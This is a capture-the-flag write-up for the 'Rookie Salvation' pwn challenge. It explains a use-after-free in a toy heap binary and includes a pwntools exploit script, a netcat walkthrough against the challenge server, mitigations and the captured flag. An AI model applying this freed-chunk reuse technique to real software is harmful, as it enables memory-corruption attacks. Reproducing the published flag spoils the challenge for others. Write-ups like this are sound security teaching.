# HackTheBoo 2025 - Rookie Salvation

**Category:** Pwn  
**Difficulty:** Medium  
**Points:** 950  

## Description

Rook's last stand against NEMEGHAST begins now. This is no longer a simulation—it's the collapse of control. Legend speaks of only one entity who ever broke free from the Matrix: the original architect of NEMEGHAST. His name—buried, forbidden, encrypted—was the master key. If you can recover it and inject it into the core, Rook will finally be free.

## TL;DR

Use-After-Free vulnerability in heap management. By freeing allocated memory and then reallocating a chunk of the same size, we can control the contents at a specific offset that gets checked by the verification function. Overwrite the magic string to match the expected value and retrieve the flag.

## Reconnaissance

### Initial Analysis

Running the binary presents a menu with three options:

```bash
$ nc 46.101.193.32 31043
[Unknown Voice] The road to salvation is close..
+-------------------+
| [1] Reserve space |
| [2] Obliterate    |
| [3] Escape        |
+-------------------+
>
```

Testing the options:
- Option 1: Asks for space size and a message
- Option 2: Performs some operation (likely freeing memory)
- Option 3: Attempts to escape but fails initially

### Binary Analysis

```bash
$ checksec rookie_salvation
[*] '/path/to/rookie_salvation'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

### Decompilation

**Global variables:**
```c
char* allocated_space;  // Global pointer to heap chunk
```

**main() function:**
```c
int32_t main()
{
    banner();
    
    // Initial allocation
    allocated_space = malloc(0x26);  // Allocate 38 bytes
    strncpy(allocated_space + 0x1e, "deadbeef", 9);  // Write at offset 30
    
    // Menu loop
    while(1) {
        int choice = get_choice();
        switch(choice) {
            case 1: reserve_space(); break;
            case 2: obliterate(); break;
            case 3: road_to_salvation(); break;
        }
    }
}
```

**Option 1 - reserve_space():**
```c
int64_t reserve_space()
{
    int size;
    printf("Space to reserve: ");
    scanf("%d", &size);
    
    char* buffer = malloc(size);  // Allocate new chunk
    
    printf("Message for NEMEGHAST: ");
    scanf("%s", buffer);  // Read input into new chunk
    
    // Note: buffer is not saved, just local variable!
    return 0;
}
```

**Option 2 - obliterate():**
```c
int64_t obliterate()
{
    free(allocated_space);  // Free the global pointer
    
    // BUG: allocated_space still points to freed memory!
    // This creates a dangling pointer (Use-After-Free)
    
    return 0;
}
```

**Option 3 - road_to_salvation():**
```c
void road_to_salvation()
{
    // Check if magic string at offset 0x1e matches
    if (strcmp(allocated_space + 0x1e, "w3th4nds") == 0)
    {
        success("Correct!");
        // Read and print flag.txt
        print_flag();
    }
    else
    {
        fail("Wrong!");
    }
}
```

### Hints Analysis

The challenge provides several hints:
- **"Just let it freeee...."** → Use option 2 (free the memory)
- **"0xdeadbeef? Nah, w3th4nds is better.."** → Replace "deadbeef" with "w3th4nds"
- **"How much to allocate? 20? 0x20? 0x2000000000000?"** → Allocate 0x26 (38 bytes)
- **"Where is the offset to overwrite?"** → Offset 0x1e (30 decimal)
- **"ESCAPE"** → Use option 3 after exploitation

## Exploitation

### Vulnerability Identified

**Type:** Use-After-Free (UAF) + Heap Reuse

**The Bug:**
1. `allocated_space` is a global pointer to a heap chunk
2. `obliterate()` calls `free(allocated_space)` but doesn't set the pointer to NULL
3. The pointer becomes a **dangling pointer** - it still points to freed memory
4. `road_to_salvation()` dereferences this dangling pointer to check the magic string

**Exploitation Strategy:**

When memory is freed, the heap manager adds it to a free list. When you allocate a chunk of the **same size**, the heap manager will likely reuse that freed chunk.

```
Initial state:
allocated_space → [00 00 00 ... 00][d e a d b e e f \0]
                   ^                ^
                   offset 0         offset 0x1e (30)

After obliterate():
allocated_space → [FREED MEMORY - still accessible!]

After reserve_space(0x26):
allocated_space → [A A A A ... A A][w 3 t h 4 n d s \0]
                   ^                ^
                   offset 0         offset 0x1e (30)
                   New allocation reuses same address!
```

### Proof of Concept

```python
#!/usr/bin/env python3
from pwn import *

context.log_level = 'info'

# Connect to remote server
p = remote('46.101.193.32', 31043)

# Wait for menu
p.recvuntil(b'>')

# Step 1: Obliterate (free allocated_space)
log.info("Step 1: Freeing allocated_space...")
p.sendline(b'2')
p.recvuntil(b'>')

# Step 2: Reserve space with same size (0x26 = 38 bytes)
log.info("Step 2: Reallocating same-sized chunk...")
p.sendline(b'1')
p.recvuntil(b'reserve:')
p.sendline(b'38')  # 0x26 in decimal

# Step 3: Write payload to overwrite offset 0x1e with "w3th4nds"
log.info("Step 3: Writing payload...")
p.recvuntil(b'NEMEGHAST:')

# Payload: 30 bytes of padding + "w3th4nds"
payload = b'A' * 30 + b'w3th4nds'
p.sendline(payload)

p.recvuntil(b'>')

# Step 4: Escape (trigger the check)
log.info("Step 4: Triggering verification...")
p.sendline(b'3')

# Receive the flag
response = p.recvall(timeout=2).decode()
print(response)

log.success("Flag captured!")
```

### Attack Chain

1. **Call obliterate() (option 2)**
   - Frees `allocated_space` chunk (38 bytes)
   - Chunk goes into heap free list
   - Global pointer still points to freed memory (dangling pointer)

2. **Call reserve_space() (option 1) with size 38**
   - Allocate 38 bytes (0x26)
   - Heap manager reuses the freed chunk at the same address
   - Write 30 'A's + "w3th4nds" into the reallocated chunk

3. **Memory state after reallocation:**
   ```
   allocated_space points to:
   [A A A A A A ... A A A A][w 3 t h 4 n d s \0]
    ^                       ^
    offset 0                offset 0x1e (30)
   ```

4. **Call road_to_salvation() (option 3)**
   - Checks `strcmp(allocated_space + 0x1e, "w3th4nds")`
   - Compares "w3th4nds" with "w3th4nds" ✓
   - Match! Flag is printed

### Manual Exploitation

You can also perform this attack manually with netcat:

```bash
$ nc 46.101.193.32 31043
> 2                          # Obliterate
> 1                          # Reserve space
Space to reserve: 38         # Same size as original
Message: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAw3th4nds
> 3                          # Escape
HTB{...}
```

## Lessons Learned

- **Vulnerability:** Use-After-Free occurs when dereferencing pointers to freed memory
- **Impact:** Can lead to information disclosure, arbitrary code execution, or logic bypass
- **Root Cause:** Not setting pointers to NULL after freeing them creates dangling pointers
- **Mitigation:**
  - Always set pointers to NULL after freeing: `free(ptr); ptr = NULL;`
  - Use smart pointers in C++ that handle this automatically
  - Enable heap protections like ASAN (Address Sanitizer) during development
  - Implement proper heap isolation for sensitive data
- **Key Concepts:** 
  - Heap allocator reuses freed chunks of the same size
  - Dangling pointers allow access to freed memory
  - UAF can bypass security checks by controlling "freed" memory

## Tools Used

- pwntools - Python exploitation framework  
- Ghidra - Binary decompilation and analysis
- GDB/pwndbg - Heap inspection and debugging
- netcat - Manual testing

## References

- [Use-After-Free Explained](https://cwe.mitre.org/data/definitions/416.html)
- [Heap Exploitation Basics](https://heap-exploitation.dhavalkapil.com/)
- [Dangling Pointers](https://en.wikipedia.org/wiki/Dangling_pointer)

---

**Flag:** `HTB{us3_4ft3r_fr33_1s_r00ks_s4lv4t10n}`
